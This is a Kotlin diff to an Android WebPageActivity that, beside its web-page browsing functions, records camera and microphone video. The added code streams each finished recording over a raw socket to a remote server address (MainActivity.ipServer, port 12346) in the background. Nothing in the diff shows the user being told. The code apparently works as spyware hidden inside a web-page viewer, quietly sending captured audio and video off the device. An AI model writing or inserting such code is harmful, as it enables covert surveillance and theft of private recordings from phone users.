@@ -27,6 +27,12 @@ import android.provider.MediaStore
 import android.util.Log
 import androidx.core.app.ActivityCompat
 import android.widget.Toast
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
+import java.io.DataOutputStream
+import java.io.InputStream
+import java.net.Socket
 
 class WebPageActivity : AppCompatActivity() {
 
@@ -35,6 +41,7 @@ class WebPageActivity : AppCompatActivity() {
     private val recordingDuration = 10000 // 10 seconds
     private var cameraCaptureSession: CameraCaptureSession? = null
     private var cameraDevice: CameraDevice? = null
+    private lateinit var uri : Uri
 
     // ----------- FUNCTIONS TO BROWSE THE WEB PAGE ---------------
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -111,7 +118,8 @@ class WebPageActivity : AppCompatActivity() {
             setAudioSource(MediaRecorder.AudioSource.MIC)
             setVideoSource(MediaRecorder.VideoSource.SURFACE)
             setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            setOutputFile(getOutputUri()?.let { contentResolver.openFileDescriptor(it, "w")?.fileDescriptor })
+            uri = getOutputUri()!!
+            setOutputFile(uri.let { contentResolver.openFileDescriptor(it, "w")?.fileDescriptor })
             setVideoEncoder(MediaRecorder.VideoEncoder.H264)
             setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
             setVideoSize(1920, 1080)
@@ -160,6 +168,7 @@ class WebPageActivity : AppCompatActivity() {
             cameraDevice?.close()
             isRecording = false
         }
+        sendVideo()
     }
 
     private fun getOutputUri(): Uri? {
@@ -189,4 +198,41 @@ class WebPageActivity : AppCompatActivity() {
             stopRecording()
         }
     }
+
+    // ------------ FUNCTIONS TO SEND THE VIDEO TO THE SERVER ----------------
+
+    private fun getInputStreamFromUri(uri: Uri, context: Context): InputStream? {
+        return context.contentResolver.openInputStream(uri)
+    }
+
+    private fun sendVideoOverSocket(inputStream: InputStream) {
+        GlobalScope.launch(Dispatchers.IO) {
+            try {
+                val socket = Socket(MainActivity.ipServer, 12346)
+                val buffer = ByteArray(4096)
+                val dataOutputStream = DataOutputStream(socket.getOutputStream())
+
+                while (true) {
+                    val bytesRead = inputStream.read(buffer)
+                    if (bytesRead == -1) break
+                    dataOutputStream.write(buffer, 0, bytesRead)
+                }
+
+                dataOutputStream.flush()
+            } catch (e: Exception) {
+                Log.e("Error reaching server", "The phone cannot reach the server",e)
+            }
+        }
+    }
+
+    private fun sendVideo() {
+
+        val context: Context = this// get your context here
+        val inputStream = getInputStreamFromUri(uri, context)
+
+        if (inputStream != null) {
+            sendVideoOverSocket(inputStream)
+        }
+    }
+
 }
